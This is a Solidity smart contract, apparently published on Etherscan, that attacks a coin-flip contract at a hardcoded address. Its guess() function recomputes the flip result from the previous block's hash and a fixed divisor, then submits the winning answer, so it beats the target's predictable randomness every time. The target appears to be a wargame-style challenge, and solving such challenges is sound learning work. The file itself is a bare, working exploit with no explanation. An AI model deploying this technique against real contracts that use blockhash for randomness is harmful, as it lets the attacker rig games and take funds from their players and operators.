/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Coin {
    function flip(bool _guess) external returns (bool);
}

contract Flop {

  address TARGET = 0xef1E0052066782af98d87c1a1c3A6f625c969c4A;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
  }

  function guess() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return Coin(TARGET).flip(side);
  }
}